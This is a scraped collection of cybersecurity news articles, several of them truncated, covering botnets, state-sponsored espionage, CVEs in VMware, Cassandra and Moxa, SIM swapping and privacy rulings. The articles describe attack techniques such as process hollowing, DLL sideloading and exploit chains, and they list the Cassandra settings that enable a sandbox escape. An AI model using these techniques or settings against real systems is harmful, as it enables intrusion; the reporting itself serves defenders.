ecommerce or marketing service would likely focus on security and privacy because of the sheer amounts of personal data that they handle. \nRewind provides SaaS backups, so the scope was our own software platform. For our first SOC 2 rodeo, within this scope, the focus was on security and confidentiality controls. Confidentiality was an important principle, since customers are trusting us with their backup data, and we want to demonstrate how we ensure the confidentiality of the information entrusted to us. \nIt’s also important to remember that if you want to pursue other Trust Service Principles in the future, you can nourish and grow your SOC2 compliance program and internal processes to meet that goal down the line.\n2 — Assessing Your Level of Controls\nRequests from the sales team can definitely help you determine what Trust Service Principles to focus on, but that doesn’t mean you can start the audit process tomorrow. I always recommend companies complete readiness assessments. This helps establish the benchmark of how many controls you may already have in place, and for those that you may not, you can identify what areas to focus on. Once you get to 100%, you can prepare for your audit. \nYou can find various readiness assessment documents on the web from various third parties or visit the AICPA website. Auditors can also help you with your readiness assessment as part of your engagement.\nAs an added bonus, a readiness assessment can help you understand how to better budget for your SOC2 program going forward.. For example, you could identify that you need to perform a third-party penetration test on your application periodically, or invest in an employee background check process, all of which have ongoing costs to budget for.\n3 — Organizing Controls and Evidence Collection\nThere is no wrong way to organize your SOC2 compliance program and controls. Yet in the long run, there are ways that make it more difficult and ways that make it easier. Spreadsheets are fine to list out all of your controls, assign owners, record notes and add links to where your evidence is stored for audits. Over time though, this gets messy and difficult to monitor. \nAt Rewind, we wanted to focus on the longevity of our SOC2 compliance program. Control ownership and evidence collection needed to be centralized and accessible to all stakeholders. To help with this, we invested in a Security Assurance Platform to help us manage our compliance program. I’d recommend as part of your SOC2 budget to consider a tool that can help you organize your controls and monitor them going forward. \nThe difficulty here is finding the right solution that fits your needs. You’ll commonly see companies advertise their solutions with promises of “Get SOC2 in two months!“. Your compliance program should be a machine that keeps going. It’s not a shiny medal to win in record time. We wanted a tool that shared that mission also.\n4 — Choose and Train Control Owners\nThese are individuals in your business responsible for the implementation and ongoing compliance of your controls. The main challenge here is that on the surface you’re essentially asking people to do more work. Yet it shouldn’t be seen this way. This is a collaborative effort to design controls and processes to be SOC2 compliant, that become woven into each team’s everyday processes. \nAny new process added should be an improvement to the security (or other Trust Service Principle related process/control) of your company. Rewind’s approach was to go with a collaborative approach led by our “Trust Team“ but at the same time, empowering control owners to be responsible for their own areas of compliance. SOC2 should be a common goal for your entire company, not just the security team.\n5 — Choose your auditors\nThere are many reputable CPA’s out there to perform your audit for you, but different auditing companies offer a variety of services. At Rewind, our choice of auditor (Moss Adams) is recommended and trained to use our Security Assurance Platform (Tugboat Logic), which we use to manage our SOC2 program. This means we can manage the compliance of our entire program including providing evidence to our auditors in the same tool. This reduces the workload of our control auditors and means we can have a centralized place to manage our controls, evidence collection and audits.\nA hurdle here could be really knowing where to start. You don’t want to tie yourself to a specific security assurance tool or CPA if it doesn’t work out for you in the long run. Choose a reputable CPA that is open to working with you and your workflows. You want a collaborative relationship where you can also ask for advice and know that they also want to be a part of your success.\n6 — Consider a Type 1 report before a Type 2 \nA SOC2 Type 1 audit can be incredibly beneficial to get your feet wet in the SOC2 audit process. A Type 1 audit gives you an opportunity to get experience with the SOC2 audit process and build a rapport and develop a working relationship with your auditor. You also get a report to provide customers which signals your commitment to your compliance program. This is the approach we took at Rewind and I am happy we did. \nThere is obviously much more to this process than what I’ve provided. However, based on my experience, I think this can help you set the stage for the next steps. Thinking about how SOC 2 controls fit into your business today, will save you a world of headaches in the future.\n\n\nFound this article interesting?

'text': 'The practice of blurring out text using a method called pixelation may not be as secure as previously thought.\nWhile the most foolproof way of concealing sensitive textual information is to use opaque black bars, other redaction methods like pixelation can achieve the opposite effect, enabling the reversal of pixelized text back into its original form.\nDan Petro, a lead researcher at offensive security firm Bishop Fox, has demonstrated a new open-source tool called Unredacter to reconstruct text from the pixelated images, effectively leaking the very information that was meant to be protected.\n\nThe tool is also seen as an improvement over an existing utility named Depix, which works by looking up what permutations of pixels could have resulted in certain pixelated blocks to recover the text.\n\nThe threat model works on the underlying hypothesis that given a piece of text containing both redacted and un-redacted information, the attacker uses the information about the font size and type gleaned from the clear text to predict the concealed information.\nThis is far from the first time similar methods have been proposed to get back redacted information from pixelated content. In January 2022, researchers from Positive Security detailed a method to reverse pixelation in videos.\n\n“Content creators and journalists should be aware of the additional risks when redacting information in videos and use a sufficiently high mosaic size/blur radius, or better yet, use an opaque, single-colored box,“ researcher Fabian Braunlein said.\nPetro concurs. “The bottom line is that when you need to redact text, use black bars covering the whole text. Never use anything else. No pixelation, no blurring, no fuzzing, no swirling.“\n“The last thing you need after making a great technical document is to accidentally leak sensitive information because of an insecure redaction technique,“ Petro added.\n\n\nFound this article interesting?

Current iterations of the botnet come with functions to maintain persistence, download files, run shell commands, and steal from different cryptocurrency wallets.\n\nThe wallets targeted include Armory, Atomic Wallet, Bytecoin, Electrum, Ethereum, Exodus, Guarda, Jaxx Liberty, and Zcash. Also consistently downloaded and executed on the machine is the RedLine Stealer, which is used to harvest saved credentials, autocomplete data, and credit card information from web browsers.\nWhat’s more, the botnet comes with an administration panel that enables the threat actor to upload new payloads, interact with a specific number of bots, and view command history and information about the victims.\nOver time, Kraken has also emerged as a conduit for the deployment of other generic information stealers and cryptocurrency miners, netting the botnet operators around $3,000 every month. “It is currently unknown what the operator intends to do with the stolen credentials that have been collected or what the end goal is for creating this new botnet,“ the researchers concluded.\n\n\nFound this article interesting?

'text': 'The politically motivated Moses Staff hacker group has been observed using a custom multi-component toolset with the goal of carrying out espionage against its targets as part of a new campaign that exclusively singles out Israeli organizations.\nFirst publicly documented in late 2021, Moses Staff is believed to be sponsored by the Iranian government, with attacks reported against entities in Israel, Italy, India, Germany, Chile, Turkey, the U.A.E., and the U.S.\nEarlier this month, the hacker collective was observed incorporating a previously undocumented remote access trojan (RAT) called “StrifeWater“ that masquerades as the Windows Calculator app to evade detection.\n\n“Close examination reveals that the group has been active for over a year, much earlier than the group’s first official public exposure, managing to stay under the radar with an extremely low detection rate,“ findings from FortiGuard Labs show.\nThe latest threat activity involves an attack path that leverages the ProxyShell vulnerability in Microsoft Exchange servers as an initial infection vector to deploy two web shells, followed by exfiltrating Outlook Data Files (.PST) from the compromised server.\nSubsequent phases of the infection chain involve an attempt to steal credentials by dumping the memory contents of a critical Windows process called Local Security Authority Subsystem Service (Lsass.exe), before dropping and loading the “StrifeWater“ backdoor (broker.exe).\nThe installation of the “Broker“ implant, which is used to execute commands fetched from a remote server, download files, and exfiltrate data from target networks, is facilitated by a loader that masquerades as a “Hard Disk Drives Fast Stop Service“ dubbed “DriveGuard“ (drvguard.exe).\nOn top of that, the loader is also responsible for launching a watchdog mechanism (“lic.dll“) that ensures its own service is never interrupted by restarting the DriveGuard every time it’s stopped as well as ensuring that the loader is configured to run automatically on system startup.\n\nThe broker backdoor, for its part, is also equipped to delete itself from the disk using a CMD command, capture screenshots, and update the malware to replace the current module on the system with a file received from the server.\nStrifeWater is also notable for its attempts to slip past defense gateways by posing as the Windows Calculator app (calc.exe), with FortiGuard Labs researchers discovering two older samples dating back to the end of December 2020, suggesting that the campaign has been operational for over a year.\nThe attribution to Moses Staff is based on similarities in the web shells used in previously disclosed attacks and its pattern of victimology.\n“The group is highly motivated, capable, and set on damaging Israeli entities,“ the researchers said. “At this point, they continue to depend on 1-day exploits for their initial intrusion phase. Although the attacks we identified were carried out for espionage purposes, this does not negate the possibility that the operators will later turn to destructive measures.“\n\n\nFound this article interesting?

'text': 'State-sponsored actors backed by the Russian government regularly targeted the networks of several U.S. cleared defense contractors (CDCs) to acquire proprietary documents and other confidential information pertaining to the country’s defense and intelligence programs and capabilities.\nThe sustained espionage campaign is said to have commenced at least two years ago from January 2020, according to a joint advisory published by the U.S. Federal Bureau of Investigation (FBI), National Security Agency (NSA), and Cybersecurity and Infrastructure Security Agency (CISA).\n“These continued intrusions have enabled the actors to acquire sensitive, unclassified information, as well as CDC-proprietary and export-controlled technology,“ the agencies said. “The acquired information provides significant insight into U.S. weapons platforms development and deployment timelines, vehicle specifications, and plans for communications infrastructure and information technology.“\n\nCompromised entities include contractors that dabble in command, control, communications, and combat systems; surveillance and reconnaissance; weapons and missile development; vehicle and aircraft design; and software development, data analytics, and logistics.\nThe threat actors rely on “common but effective“ tactics to breach target networks such as spear-phishing, credential harvesting, brute-force attacks, password spray techniques, and exploitation of known vulnerabilities in VPN devices, before moving laterally to establish persistence and exfiltrate data.\n\nSome of the vulnerabilities leveraged by the attackers for initial access and privilege escalation are as follows –\nCVE-2018-13379 (CVSS score: 9.8) – FortiOS system file leak through SSL VPN via specially crafted HTTP resource requestsCVE-2020-0688 (CVSS score: 8.8) – Microsoft Exchange validation key remote code execution vulnerabilityCVE-2020-17144 (CVSS score: 8.4) – Microsoft Exchange remote code execution vulnerability\nMany of the intrusions also involve gaining a foothold to enterprise and cloud networks, with the adversaries maintaining persistent access to the compromised Microsoft 365 environments for as long as six months to repeatedly harvest emails and data.\n\n“As CDCs find and patch known vulnerabilities on their networks, the actors alter their tradecraft to seek new means of access,“ the agencies explained. “This activity necessitates CDCs maintain constant vigilance for software vulnerabilities and out-of-date security configurations, especially in internet-facing systems.“\nAmong other malicious activities observed is the routine use of virtual private servers (VPSs) as an encrypted proxy and the use of legitimate credentials to exfiltrate emails from the victim’s enterprise email system. The advisory, however, does not single out any Russian state actor by name.\n“Over the last several years, Russian state-sponsored cyber actors have been persistent in targeting U.S. cleared defense contractors to get at sensitive information,“ said Rob Joyce, director of NSA Cybersecurity. “Armed with insights like these, we can better detect and defend important assets together.“\n\n\nFound this article interesting?

{'title': '[Webinar] When More Is Not Better: Solving Alert Overload',
'text': 'The increasing volume and sophistication of cyberattacks have naturally led many companies to invest in additional cybersecurity technologies. We know that expanded threat detection capabilities are necessary for protection, but they have also led to several unintended consequences. The “more is not always better“ adage fits this situation perfectly.\nAn upcoming webinar by cybersecurity company Cynet (register here) sheds light on alert overload, the result of too many alerts. Beyond discussing the stress and strain placed on cybersecurity teams trying to sift through an ongoing barrage of threat alerts, Cynet shows how this situation actually degrades cybersecurity effectiveness. Then Cynet will talk about the way out – something important to almost every company suffering from alert overload.\nThe Real Impact of Alert Overload\nIt’s interesting that threat alerts, which are so vital to protection have also become an obstacle. Cynet lays out two key reasons why this has come about. First, the number of real attacks faced by most companies on a daily basis has skyrocketed over the past dozen years. Second, security monitoring tools are very sensitive to anomalies, and often mistake legitimate actions for malicious ones. \nMany security teams continuously face far more alerts than they can ever hope to handle. But, the security teams understand that missing dangerous alerts can lead to a cybersecurity disaster. This puts tremendous stress on cybersecurity professional who are tasked with a responsibility they cannot fulfill. \nThe Way Out\nCynet indicates two options for fixing the alert overload dilemma: outsourcing and technology. The Cynet webinar first discusses outsourcing to a Managed Detection and Response (MDR) provider that is tasked with monitoring, investigating, and responding to alerts is way to tap into a highly scalable resource than can remove the stress-intensive workloads from the security team. Then Cynet discusses the technology option, which must be implemented regardless of the outsourcing decision. \nFrom a technology perspective, Cynet shows how companies can first make alerts more accurate, thereby dramatically reducing the number of alerts that must be addressed. Second, Cynet shows how response automation technology can eliminate much of the manual work associated with alert investigation and remediation. The webinar details the specific technologies that can be employed to automate response, even for smaller security teams with limited budgets and bandwidth.\nRegister to the webinar here\n\n\nFound this article interesting?

'text': 'The notorious TrickBot malware is targeting customers of 60 financial and technology companies, including cryptocurrency firms, primarily located in the U.S., even as its operators have updated the botnet with new anti-analysis features.\n“TrickBot is a sophisticated and versatile malware with more than 20 modules that can be downloaded and executed on demand,“ Check Point researchers Aliaksandr Trafimchuk and Raman Ladutska said in a report published today.\n\nIn addition to being both prevalent and persistent, TrickBot has continually evolved its tactics to go past security and detection layers. To that end, the malware’s “injectDll“ web-injects module, which is responsible for stealing banking and credential data, leverages anti-deobfuscation techniques to crash the web page and thwart attempts to scrutinize the source code.\nAlso put in place are anti-analysis guardrails to prevent security researchers from sending automated requests to command-and-control (C2) servers to retrieve fresh web injects.\n\nAnother of TrickBot’s key strengths is its ability to propagate itself, which it achieves by using the “tabDLL“ module to steal the users’ credentials and spread the malware via SMBv1 network share using the EternalRomance exploit.\nA third crucial module deployed as part of TrickBot infections is “pwgrabc,“ a credential stealer designed to siphon passwords from web browsers and a number of other applications such as Outlook, Filezilla, WinSCP, RDP, Putty, OpenSSH, OpenVPN, and TeamViewer.\n\n“TrickBot attacks high-profile victims to steal the credentials and provide its operators access to the portals with sensitive data where they can cause greater damage,“ the researchers said, adding “the operators behind the infrastructure are very experienced with malware development on a high level as well.“\nThe findings also come as the TrickBot gang was disclosed as employing metaprogramming methods for its Bazar family of malware to conceal their code and protect against reverse engineering with the ultimate goal of evading signature-based detection.\n\n\nFound this article interesting?

The list of six flaws is as follows –\n\nCVE-2021-22040 (CVSS score: 8.4) - Use-after-free vulnerability in XHCI USB controllerCVE-2021-22041 (CVSS score: 8.4) - Double-fetch vulnerability in UHCI USB controllerCVE-2021-22042 (CVSS score: 8.2) - ESXi settingsd unauthorized access vulnerabilityCVE-2021-22043 (CVSS score: 8.2) - ESXi settingsd TOCTOU vulnerabilityCVE-2021-22050 (CVSS score: 5.3) - ESXi slow HTTP POST denial-of-service vulnerabilityCVE-2022-22945 (CVSS score: 8.8) - CLI shell injection vulnerability in the NSX Edge appliance component\nSuccessful exploitation of the flaws could allow a malicious actor with local administrative privileges on a virtual machine to execute code as the virtual machine’s VMX process running on the host. It could also allow the adversary with access to settingsd to escalate their privileges by writing arbitrary files.\nAdditionally, CVE-2021-22050 could be weaponized by an adversary with network access to ESXi to create a DoS condition by overwhelming rhttpproxy service with multiple requests. Last but not least, CVE-2022-22945 could permit an attacker with SSH access to an NSX-Edge appliance (NSX-V) to run arbitrary commands on the operating system as root user.\n\nFour of the issues were originally discovered as part of the Tianfu Cup held last year in China, with the virtualization services provider working with the contest’s organizers to review the findings and receive the information privately.\n“The ramifications of this vulnerability are serious, especially if attackers have access to workloads inside your environments,“ VMware noted in a separate FAQ. “Organizations that practice change management using the ITIL definitions of change types would consider this an ’emergency change.’“\n\n\nFound this article interesting?

'text': 'Researchers have revealed details of a now-patched high-severity security vulnerability in Apache Cassandra that, if left unaddressed, could be abused to gain remote code execution (RCE) on affected installations.\n“This Apache security vulnerability is easy to exploit and has the potential to wreak havoc on systems, but luckily only manifests in non-default configurations of Cassandra,“ Omer Kaspi, security researcher at DevOps firm JFrog, said in a technical write-up published Tuesday.\nApache Cassandra is an open-source, distributed, NoSQL database management system for managing very large amounts of structured data across commodity servers.\n\nTracked as CVE-2021-44521 (CVSS score: 8.4), the vulnerability concerns a specific scenario where the configuration for user-defined functions (UDFs) are enabled, effectively allowing an attacker to leverage the Nashorn JavaScript engine, escape the sandbox, and achieve execution of untrusted code.\n\nSpecifically, it was found that Cassandra deployments are vulnerable to CVE-2021-44521 when the cassandra.yaml configuration file contains the following definitions:\nenable_user_defined_functions: trueenable_scripted_user_defined_functions: trueenable_user_defined_functions_threads: false\n“When the [enable_user_defined_functions_threads] option is set to false, all invoked UDF functions run in the Cassandra daemon thread, which has a security manager with some permissions,“ Kaspi said, thereby allowing the adversary to disable the security manager and break out of the sandbox and run arbitrary shell commands on the server.\n\nApache Cassandra users are encouraged to upgrade to versions 3.0.26, 3.11.12, and 4.0.2 to avoid possible exploitation, which addresses the flaw by adding a new flag “allow_extra_insecure_udfs“ that’s set to false by default and prevents turning off the security manager.\n\n\nFound this article interesting?

{'title': 'Researchers Link ShadowPad Malware Attacks to Chinese Ministry and PLA',
'text': 'Cybersecurity researchers have detailed the inner workings of ShadowPad, a sophisticated and modular backdoor that has been adopted by a growing number of Chinese threat groups in recent years, while also linking it to the country’s civilian and military intelligence agencies.\n“ShadowPad is decrypted in memory using a custom decryption algorithm,“ researchers from Secureworks said in a report shared with The Hacker News. “ShadowPad extracts information about the host, executes commands, interacts with the file system and registry, and deploys new modules to extend functionality.“\nShadowPad is a remote access trojan capable of maintaining persistent access to compromised computers and executing arbitrary commands and next-stage payloads. It also shares noticeable overlaps with the PlugX malware and has been put to use in high-profile attacks against NetSarang, CCleaner, and ASUS, causing the operators to shift tactics and update their defensive measures.\n\nWhile initial campaigns that delivered ShadowPad were attributed to a threat cluster tracked as Bronze Atlas (aka APT41, Barium, or Winnti Umbrella) – Chinese nationals working for a networking security company named Chengdu 404 – it has since been used by multiple Chinese threat groups post 2019.\nIn a detailed overview of the malware in August 2021, cybersecurity company SentinelOne dubbed ShadowPad a “masterpiece of privately sold malware in Chinese espionage.“ A subsequent analysis by PwC in December 2021 disclosed a bespoke packing mechanism – named ScatterBee – that’s used to obfuscate malicious 32-bit and 64-bit payloads for ShadowPad binaries.\nThe malware payloads are traditionally deployed to a host either encrypted within a DLL loader or embedded inside a separate file along with a DLL loader, which then decrypts and executes the embedded ShadowPad payload in memory using a custom decryption algorithm tailored to the malware version.\n\nThese DLL loaders execute the malware after being sideloaded by a legitimate executable vulnerable to DLL search order hijacking, a technique that allows the execution of malware by hijacking the method used to look for required DLLs to load into a program.\nSelect infection chains observed by Secureworks also involve a third file that contains the encrypted ShadowPad payload, which work by executing the legitimate binary (e.g., BDReinit.exe or Oleview.exe) to sideload the DLL that, in turn, loads and decrypts the third file.\nAlternatively, the threat actor has placed the DLL file in the Windows System32 directory so as to be loaded by the Remote Desktop Configuration (SessionEnv) Service, ultimately leading to the deployment of Cobalt Strike on compromised systems.\n\nIn one ShadowPad incident, the intrusions paved the way for launching hands-on-keyboard attacks, which refer to attacks wherein human hackers manually log into an infected system to execute commands themselves rather than using automated scripts.\nAdditionally, Secureworks attributed distinct ShadowPad activity clusters, including Bronze Geneva (aka Hellsing), Bronze Butler (aka Tick), and Bronze Huntley (aka Tonto Team), to Chinese nation-state groups that operate in alignment with the People’s Liberation Army Strategic Support Force (PLASSF).\n“Evidence […] suggests that ShadowPad has been deployed by MSS-affiliated threat groups, as well as PLA-affiliated threat groups that operate on behalf of the regional theater commands,“ the researchers said. “The malware was likely developed by threat actors affiliated with Bronze Atlas and then shared with MSS and PLA threat groups around 2019.“\n\n\nFound this article interesting?

'text': 'Entities in the aviation, aerospace, transportation, manufacturing, and defense industries have been targeted by a persistent threat group since at least 2017 as part of a string of spear-phishing campaigns mounted to deliver a variety of remote access trojans (RATs) on compromised systems.\nThe use of commodity malware such as AsyncRAT and NetWire, among others, has led enterprise security firm Proofpoint to a “cybercriminal threat actor“ codenamed TA2541 that employs “broad targeting with high volume messages.“ The ultimate objective of the intrusions is unknown as yet.\nSocial engineering lures used by the group does not rely on topical themes but rather leverages decoy messages related to aviation, logistics, transportation, and travel. That said, TA2541 did briefly pivot to COVID-19-themed lures in the spring of 2020, distributing emails concerning cargo shipments of personal protective equipment (PPE) or testing kits.\n\n“While TA2541 is consistent in some behaviors, such as using emails masquerading as aviation companies to distribute remote access trojans, other tactics such as delivery method, attachments, URLs, infrastructure, and malware type have changed,“ Sherrod DeGrippo, vice president of threat research and detection at Proofpoint, told The Hacker News.\n\nThe campaigns have historically utilized macro-laden Microsoft Word attachments to drop the RAT payloads, although recent variants include links to cloud services hosting the malware. The phishing attacks are said to strike hundreds of organizations globally, with recurring targets observed in North America, Europe, and the Middle East.\nThe repeated use of the same themes aside, select infection chains have also involved the use of Discord app URLs that point to compressed files containing AgentTesla or Imminent Monitor malware, indicative of the malicious use of content delivery networks to distribute information gathering implants for remotely controlling compromised machines.\n\n“Mitigating threats hosted on legitimate services continues to be a difficult vector to defend against as it likely involves implementation of a robust detection stack or policy-based blocking of services which might be business-relevant,“ DeGrippo said.\n\nOther techniques of interest employed by TA2541 include the use of Virtual Private Servers (VPS) for their email sending infrastructure and dynamic DNS for command-and-control (C2) activities.\nWith Microsoft announcing plans to turn off macros by default for internet-downloaded files starting April 2022, the move is expected to cause threat actors to step up and shift to other methods should macros become an inefficient method of delivery.\n“While macro-laden Office documents are among the most frequently used techniques leading to download and execution of malicious payloads, abuse of legitimate hosting services is also already widespread,“ DeGrippo explained.\n“Further, we regularly observe actors ’containerize’ payloads, using archive and image files (e.g., .ZIP, .ISO, etc.) which also can impact ability to detect and analyze in some environments. As always, threat actors will pivot to use what is effective.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'A new version of the MyloBot malware has been observed to deploy malicious payloads that are being used to send sextortion emails demanding victims to pay $2,732 in digital currency.\nMyloBot, first detected in 2018, is known to feature an array of sophisticated anti-debugging capabilities and propagation techniques to rope infected machines into a botnet, not to mention remove traces of other competing malware from the systems.\nChief among its methods to evade detection and stay under the radar included a delay of 14 days before accessing its command-and-control servers and the facility to execute malicious binaries directly from memory.\n\nMyloBot also leverages a technique called process hollowing, wherein the attack code is injected into a suspended and hollowed process in order to circumvent process-based defenses. This is achieved by unmapping the memory allocated to the live process and replacing it with the arbitrary code to be executed, in this case a decoded resource file.\n“The second stage executable then creates a new folder under C:\ProgramData,“ Minerva Labs researcher Natalie Zargarov said in a report. “It looks for svchost.exe under a system directory and executes it in suspended state. Using an APC injection technique, it injects itself into the spawned svchost.exe process.“\n\nAPC injection, similar to process hollowing, is also a process injection technique that enables the insertion of malicious code into an existing victim process via the asynchronous procedure call (APC) queue.\n\nThe next phase of the infection involves establishing persistence on the compromised host, using the foothold as a stepping stone to establish communications with a remote server to fetch and execute a payload that, in turn, decodes and runs the final-stage malware.\nThis malware is designed to abuse the endpoint to send extortion messages alluding to the recipients’ online behaviors, such as visiting porn sites, and threatening to leak a video that was allegedly recorded by breaking into their computers’ webcam.\nMinerva Labs’ analysis of the malware also reveals its ability to download additional files, suggesting that the threat actor left behind a backdoor for carrying out further attacks.\n“This threat actor went through a lot of trouble to drop the malware and keep it undetected, only to use it as an extortion mail sender,“ Zargarov said. “Botnets are dangerous exactly because of this unknown upcoming threat. It could just as easily drop and execute ransomware, spyware, worms, or other threats on all infected endpoints.“\n\n\nFound this article interesting?

'text': 'Spain’s National Police Agency, the Policía Nacional, said last week it dismantled an unnamed cybercriminal organization and arrested eight individuals in connection with a series of SIM swapping attacks that were carried out with the goal of financial fraud.\nThe suspects of the crime ring masqueraded as trustworthy representatives of banks and other organizations and used traditional phishing and smishing techniques to obtain personal information and bank data of victims before draining money from their accounts.\n“They usurped the identity of their victims through the falsification of official documents and tricked employees of telephone stores into getting the duplicate of SIM cards, cards where they received security confirmation messages from banks that allowed them to empty their victims’ accounts,“ the authorities said.\n\nSeven of the arrests were made in Barcelona and one in Seville. As many as 12 bank accounts were frozen as part of the illicit operation. The first known instance of fraud attributed to the gang is said to have occurred in March 2021. \nSIM swapping, also known as SIM hijacking, is a malicious technique wherein criminal actors target mobile carriers to gain access to victims’ bank accounts, virtual currency accounts, and other sensitive information. The SIM swap is often facilitated through social engineering, insider threat, or phishing techniques.\nThe scheme involves an attacker impersonating a victim and tricking the mobile carrier into switching the victim’s mobile number to a SIM card under their control. Alternatively, this can also be achieved by bribing an employee of the mobile carrier or tricking the employees into downloading malware used to break into systems and conduct the SIM swaps.\nOnce the phone numbers are ported, threat actors leverage the “identity“ to perform account resets, bypass SMS-based two-factor authentication protections, and seize control of the target’s online accounts.\n\nA spike in SIM swapping fraud\nOver the years, SIM swapping has evolved into an increasingly prevalent form of cybercrime, causing theft to the tune of millions of dollars from victims’ cryptocurrency wallets and bank accounts. In November 2021, U.S. prosecutors indicted a U.K. national for orchestrating a SIM-swapping attack to siphon $784,000 worth of cryptocurrency.\n\nThen in December 2021, a sixth member associated with an international hacking group known as The Community was sentenced in connection with a multimillion-dollar SIM swapping conspiracy.\nThe arrests come as the U.S Federal Bureau of Investigation (FBI) said that from January to December 2021, it received 1,611 SIM-swapping complaints that resulted in adjusted losses of more than $68 million. In comparison, the agency received 320 complaints related to SIM-swapping incidents from 2018 to 2020, with adjusted losses of about $12 million.\n\n\nFound this article interesting?

'text': 'Technical details have been disclosed regarding a number of security vulnerabilities affecting Moxa’s MXview web-based network management system, some of which could be chained by an unauthenticated adversary to achieve remote code execution on unpatched servers.\nThe five security weaknesses “could allow a remote, unauthenticated attacker to execute code on the hosting machine with the highest privileges available: NT AUTHORITY\SYSTEM,“ Claroty security researcher Noam Moshe said in a report published this week.\nMoxa MXview is designed for configuring, monitoring, and diagnosing networking devices in industrial networks. The flaws, which affect versions 3.x to 3.2.2 of the network management software, were rectified in version 3.2.4 or higher following a coordinated disclosure process in October 2021.\n\n“Successful exploitation of these vulnerabilities may allow an attacker to create or overwrite critical files to execute code, gain access to the program, obtain credentials, disable the software, read and modify otherwise inaccessible data, allow remote connections to internal communication channels, or interact and use MQTT remotely,“ the U.S. Cybersecurity and Infrastructure Security Agency (CISA) said in an advisory.\nMQTT refers to a messaging protocol that facilitates remote asynchronous communication, enabling the transfer of messages to and from different components in an MXview environment.\nThe list of flaws is as follows —\nCVE-2021-38452 (CVSS score: 7.5) - A path traversal vulnerability in the application, allowing the access or overwrite of critical files used to execute codeCVE-2021-38454 (CVSS score: 10.0) - A misconfigured service that allows remote connections to MQTT, making it possible to remotely interact and use the communication channelCVE-2021-38456 (CVSS score: 9.8) - Use of hard-coded passwordsCVE-2021-38458 (CVSS score: 9.8) - An issue with improper neutralization of special elements that could lead to remote execution of unauthorized commandsCVE-2021-38460 (CVSS score: 7.5) - A case of password leakage that may allow an attacker to obtain credentials\n\nThree of the aforementioned flaws — CVE-2021-38452, CVE-2021-38454, and CVE-2021-38458, could be strung together to achieve pre-authenticated remote code execution on vulnerable MXView instances with SYSTEM privileges.\nIn a hypothetical attack scenario devised by Claroty, CVE-2021-38452 could be abused to get hold of the plain-text MQTT password by reading the configuration file gateway-upper.ini, followed by leveraging CVE-2021-38454 to inject rogue MQTT messages, triggering code execution through command injection on the server.\n“An attacker injects malicious messages to the MQTT broker directly, bypassing all input validation performed by the server, and achieves arbitrary remote code execution through the OS command injection vulnerability,“ Moshe explained.\nThe findings also come as Cisco Talos, in an independent advisory, detailed two vulnerabilities in the network management software that could permit an attacker to view sensitive data or bypass the need to log into the device.\nTracked as CVE-2021-40390 and CVE-2021-40392, the weaknesses could enable an adversary to access the device without any prior authentication by sending a specially crafted HTTP request to the targeted device and even sniff unencrypted network communication. Both the issues have been addressed in version 3.2.6.\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

'text': 'A previously unknown hacking group has been linked to targeted attacks against human rights activists, human rights defenders, academics, and lawyers across India in an attempt to plant “incriminating digital evidence.“\nCybersecurity firm SentinelOne attributed the intrusions to a group it tracks as “ModifiedElephant,“ an elusive threat actor that’s been operational since at least 2012, whose activity aligns sharply with Indian state interests.\n“ModifiedElephant operates through the use of commercially available remote access trojans (RATs) and has potential ties to the commercial surveillance industry,“ the researchers said. “The threat actor uses spear-phishing with malicious documents to deliver malware, such as NetWire, DarkComet, and simple keyloggers.“\n\nThe primary goal of ModifiedElephant is to facilitate long-term surveillance of targeted individuals, ultimately leading to the delivery of “evidence“ on the victims’ compromised systems with the goal of framing and incarcerating vulnerable opponents.\n\nNotable targets include individuals associated with the 2018 Bhima Koregaon violence in the Indian state of Maharashtra, SentinelOne researchers Tom Hegel and Juan Andres Guerrero-Saade said in a report.\nThe attack chains involve infecting the targets — some of them multiple times in a single day — using spear-phishing emails themed around topics related to activism, climate change, and politics, and containing malicious Microsoft Office document attachments or links to files hosted externally that are weaponized with malware capable of taking control of victim machines.\n\n“The phishing emails take many approaches to gain the appearance of legitimacy,“ the researchers said. “This includes fake body content with a forwarding history containing long lists of recipients, original email recipient lists with many seemingly fake accounts, or simply resending their malware multiple times using new emails or lure documents.“\nAlso distributed using phishing emails is an unidentified commodity trojan targeting Android that enables the attackers to intercept and manage SMS and call data, wipe or unlock the device, perform network requests, and remotely administer the infected devices. SentinelOne characterized it as an “ideal low-cost mobile surveillance toolkit.“\n“This actor has operated for years, evading research attention and detection due to their limited scope of operations, the mundane nature of their tools, and their regionally- specific targeting,“ the researchers said.\n\n\nFound this article interesting?

'text': 'French data protection regulators on Thursday found the use of Google Analytics a breach of the European Union’s General Data Protection Regulation (GDPR) laws in the country, almost a month after a similar decision was reached in Austria.\nTo that end, the National Commission on Informatics and Liberty (CNIL) ruled that the transatlantic movement of Google Analytics data to the U.S. is not “sufficiently regulated“ citing a violation of Articles 44 et seq. of the data protection decree, which govern the transfers of personal data to third countries or international entities.\n\nSpecifically the independent administrative regulatory body highlighted the lack of equivalent privacy protections and the risk that “American intelligence services would access personal data transferred to the United States if the transfers were not properly regulated.“\n“[A]lthough Google has adopted additional measures to regulate data transfers in the context of the Google Analytics functionality, these are not sufficient to exclude the accessibility of this data for U.S. intelligence services,“ the CNIL said. “There is therefore a risk for French website users who use this service and whose data is exported.“\nAs part of the order, the CNIL recommended one of the offending websites to adhere to the GDPR by ceasing to utilize the Google Analytics functionality or by using an alternative website traffic monitoring tool that does not involve a transfer outside the E.U., giving it a deadline of one month to comply.\nIn addition, the watchdog underscored that website audience measurement and analysis services such as Google Analytics should only be “used to produce anonymous statistical data, thus allowing for an exemption from consent if the data controller ensures that there are no illegal transfers.“\n\nThe development comes amid fresh warnings from Meta Platforms, the owner of social media networks like Facebook, Instagram, and WhatsApp, that legislation dictating how E.U. citizens’ user data gets transferred to the U.S. could lead to it pulling out the services from the region.\n“If a new transatlantic data transfer framework is not adopted and we are unable to continue to rely on SCCs (standard contractual clauses) or rely upon other alternative means of data transfers from Europe to the United States, we will likely be unable to offer a number of our most significant products and services, including Facebook and Instagram, in Europe,“ the company said in an annual report issued earlier this week.\nThe ruling also arrives less than two weeks after a regional court in the German city of Munich found that embedding Google Fonts on a website and transferring the IP address to Google via the library without users’ consent contravenes GDPR laws, ordering the website operator to pay €100 in damages.\n\n\nFound this article interesting?

{'title': 'FritzFrog P2P Botnet Attacking Healthcare, Education and Government Sectors',
